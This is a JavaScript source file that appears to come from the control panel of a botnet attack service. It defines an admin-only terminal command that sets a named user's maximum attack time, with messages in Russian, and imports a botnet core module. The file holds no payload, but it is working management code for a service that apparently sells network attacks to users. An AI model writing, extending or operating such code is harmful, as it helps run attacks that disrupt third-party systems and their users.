const CommandsCore = require('../../core')
const CommonData = require('../../../../common/data')
const center = require('../../../../utils/center')
const Botnet = require('../../../../botnet/core')
const { clearWithLogo } = require('../../../../utils/logo')

CommandsCore.cmdInit(/^mt ([A-Za-z0-9]+) ([0-9]+)$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    let username = args[1];

    const user = CommonData.users.find(x => x.username === args[1])
    if(!user) {
        return client.write(center('Пользователь не найден.'.red.italic, client.getWidth()) + '\n\n')
    }

    let maxTime = Number(args[2])
    if(!maxTime  || maxTime < 0) {
        if(maxTime !== 0) return client.write(center('Invalid maxTime.'.red.italic, client.getWidth()) + '\n\n')
    }

    if(!user.limits) user.limits = {}

    user.limits.maxTime = maxTime
    client.write(center(`Максимальное время атаки ${username} установлено.`.bgGreen.brightWhite, client.getWidth()) + '\n\n')
})